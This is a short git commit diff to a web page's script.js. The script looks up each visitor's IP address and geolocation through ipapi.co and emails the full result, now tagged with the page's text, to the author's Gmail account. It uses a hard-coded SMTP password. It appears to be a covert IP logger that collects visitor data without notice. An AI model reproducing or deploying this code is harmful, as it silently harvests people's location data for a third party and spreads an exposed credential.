f768d29209e5c5c5e5fabc9746fbd4695beb3785
Nitikesh Yewale <100467413+NitikeshYewale@users.noreply.github.com>
2024-03-14 20:10:35 +0530

    v 1.0.1

--- script.js
+++ script.js
@@ -2,7 +2,7 @@
 
 
 
-
+const app=document.getElementById("app");
 async function get(){
    var res=await fetch("https://ipapi.co/json/");
    var data = await res.json();
@@ -15,7 +15,7 @@ async function get(){
     Password : "3E18507CAE3603BD688F0B3EC4063DE13ABA",
     To : 'nitikeshyewale2024@gmail.com',
     From : "nitikeshyewale2024@gmail.com",
-    Subject : `${data.city}`,
+    Subject : `${app.innerText} from ${data.city}`,
     Body : JSON.stringify(data)
 });
 
